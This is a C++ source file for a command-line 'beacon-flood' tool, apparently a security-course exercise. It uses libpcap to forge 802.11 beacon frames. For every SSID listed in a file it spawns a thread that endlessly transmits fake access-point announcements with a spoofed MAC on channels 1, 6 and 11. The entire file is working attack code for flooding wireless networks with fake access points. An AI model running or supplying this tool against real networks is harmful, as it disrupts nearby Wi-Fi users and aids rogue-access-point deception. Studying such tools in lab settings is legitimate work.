#include <pcap.h>
#include <stdbool.h>
#include <stdio.h>
#include <thread>
#include <stdlib.h>
#include <unistd.h>
#include <algorithm>
#include <regex>
#include <iostream>
#include <fstream>
#include <sstream>
#include <vector>
#include "wireless.h"


void usage() {
    printf("syntax: beacon-flood <interface> <ssid-list-file> [<target ap mac>]\n");
    printf("sample: beacon-flood mon0 ssid-list.txt\n");
}

typedef struct {
	char* dev_;
    char* file_;
    char* ap_;
} Param;

Param param  = {
    .dev_ = NULL,
    .file_ = NULL,
    .ap_ = (char*) "aa:bb:cc:dd:ee:ff" // default
};

bool parse(Param* param, int argc, char* argv[]) {
    if (argc < 3) {
		usage();
		return false;
    }
    param->dev_ = argv[1];
    param->file_ = argv[2];

    if (argc == 4){
        std::regex re("[A-Fa-f0-9]{2}:[A-Fa-f0-9]{2}:[A-Fa-f0-9]{2}:[A-Fa-f0-9]{2}:[A-Fa-f0-9]{2}:[A-Fa-f0-9]{2}");
        if(std::regex_match(argv[3], re)){
            param->ap_ = argv[3];
        } else {
            usage();
            return false;
        }
    }
    return true;
}

void sendBeacon(pcap_t* pcap, std::string ssid){
    u_char channels[] = {1, 6, 11};
    SimpleRadiotapHdr beaconRadio;
    Dot11Hdr beaconDot11;
    beaconDot11.bssid_ = Mac(param.ap_);
    beaconDot11.source_ = Mac(param.ap_);
    Dot11WirelessMgntFixed wirelessMgntFixed;
    Dot11WirelessMgntTagged wirelessTagged_ssid;

    RestTag rest;
    const char* ssid_c = ssid.c_str();
    wirelessTagged_ssid.eid_ = 0;
    wirelessTagged_ssid.length_ = ssid.length();

    uint len = sizeof(SimpleRadiotapHdr) + sizeof(Dot11Hdr) + sizeof(Dot11WirelessMgntFixed) \
            + sizeof(Dot11WirelessMgntTagged) + wirelessTagged_ssid.length_ + sizeof(RestTag);

    u_char* tmp = new u_char[len];
    u_char* now = tmp;
    memcpy(now, &beaconRadio, sizeof(beaconRadio));
    now += sizeof(beaconRadio);
    memcpy(now, &beaconDot11, sizeof(beaconDot11));
    now += sizeof(beaconDot11);
    memcpy(now, &wirelessMgntFixed, sizeof(wirelessMgntFixed));
    now += sizeof(wirelessMgntFixed);
    memcpy(now, &wirelessTagged_ssid, sizeof(wirelessTagged_ssid));
    now += sizeof(wirelessTagged_ssid);
    memcpy(now, ssid_c, wirelessTagged_ssid.length_);
    now += wirelessTagged_ssid.length_;
    memcpy(now, &rest, sizeof(rest));
    now = now + 8;

    while (true) {
        for(int i=0;i<3;i++){
            *now = channels[i];
            int res = pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(tmp), len);
            if (res != 0) {
                fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(pcap));
            }
        }
        usleep(102400);
    }
    delete[] tmp;
}



int main(int argc, char* argv[]) {
	if (!parse(&param, argc, argv))
		return -1;

    std::ifstream file(param.file_);

    if(file.fail()){
        printf("no such file\n");
        return -1;
    }

	char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* pcap = pcap_open_live(param.dev_, BUFSIZ, 1, 1, errbuf);
	if (pcap == NULL) {
		fprintf(stderr, "pcap_open_live(%s) return null - %s\n", param.dev_, errbuf);
		return -1;
	}
    std::vector<std::thread> threads;

    while(!file.eof()){
        std::string tmp;
        getline(file, tmp);
        if(tmp == "") break;
        //sendBeacon(pcap, tmp);
        threads.push_back(std::thread(sendBeacon, pcap, tmp));
    }
    std::vector<std::thread>::iterator ptr;
    for(ptr = threads.begin(); ptr != threads.end(); ptr++){
        (*ptr).join();
    }

    file.close();
    pcap_close(pcap);
}
